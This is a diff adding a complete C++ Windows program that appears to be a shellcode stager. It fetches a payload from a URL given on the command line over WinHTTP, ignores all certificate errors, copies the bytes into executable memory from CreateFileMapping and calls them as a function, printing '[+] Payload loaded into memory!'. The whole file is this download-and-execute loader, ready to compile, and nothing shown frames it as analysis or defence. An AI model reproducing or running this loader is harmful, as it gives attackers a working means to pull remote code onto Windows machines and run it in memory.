@@ -1,0 +1,65 @@
+#include <stdio.h>
+#include <windows.h>
+#include <winhttp.h>
+#include <iostream>
+#include <string>
+
+#pragma comment(lib, "winhttp.lib")
+
+unsigned char b[999999999];
+
+void d(const wchar_t* h, short p, const wchar_t* e, bool s) {
+    int c = 0;
+    DWORD sz;
+    LPSTR buf;
+    HINTERNET hs = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (hs) {
+        HINTERNET hc = WinHttpConnect(hs, h, p, 0);
+        if (hc) {
+            DWORD f = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+            HINTERNET hr = WinHttpOpenRequest(hc, L"GET", e, L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, s ? WINHTTP_FLAG_SECURE : 0);
+            if (hr && WinHttpSetOption(hr, WINHTTP_OPTION_SECURITY_FLAGS, &f, sizeof(f)) && WinHttpSendRequest(hr, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) && WinHttpReceiveResponse(hr, NULL)) {
+                do {
+                    sz = 0;
+                    if (!WinHttpQueryDataAvailable(hr, &sz) || sz == 0) break;
+                    buf = new char[sz + 1];
+                    if (!buf) break;
+                    ZeroMemory(buf, sz + 1);
+                    DWORD downloaded;
+                    if (!WinHttpReadData(hr, (LPVOID)buf, sz, &downloaded) || downloaded == 0) {
+                        delete[] buf;
+                        break;
+                    }
+                    for (DWORD i = 0; i < sz && c < sizeof(b); ++i, ++c) memcpy(&b[c], &buf[i], sizeof(char));
+                    delete[] buf;
+                } while (sz > 0);
+                if (c > 0) printf("[+] Payload loaded into memory!\n");
+            }
+            if (hr) WinHttpCloseHandle(hr);
+            WinHttpCloseHandle(hc);
+        }
+        WinHttpCloseHandle(hs);
+    }
+}
+
+int main(int argc, char* argv[]) {
+    if (argc != 2) { std::cout << "Usage: <URL>\nExample: http://example.com/file.bin" << std::endl; return 1; }
+    std::wstring u(argv[1], argv[1] + strlen(argv[1])), p = L"http://", h, e;
+    size_t po = u.find(p);
+    bool s = false;
+    if (po != std::wstring::npos) h = u.substr(po + p.length()), s = false;
+    else if ((po = u.find(L"https://")) != std::wstring::npos) h = u.substr(po + 8), s = true;
+    else { std::cerr << "Error: Invalid URL." << std::endl; return 1; }
+    po = h.find('/');
+    if (po != std::wstring::npos) e = h.substr(po), h.erase(po);
+    else e = L"/";
+    po = h.find(':');
+    short pt = (po != std::wstring::npos) ? std::stoi(h.substr(po + 1)) : (s ? 443 : 80);
+    h = (po != std::wstring::npos) ? h.substr(0, po) : h;
+    d(h.c_str(), pt, e.c_str(), s);
+    HANDLE m = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(b), NULL);
+    void* mm = MapViewOfFile(m, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0x0, 0x0, sizeof(b));
+    std::memcpy(mm, b, sizeof(b));
+    std::cout << ((int(*)())mm)() << std::endl;
+    return 0;
+}
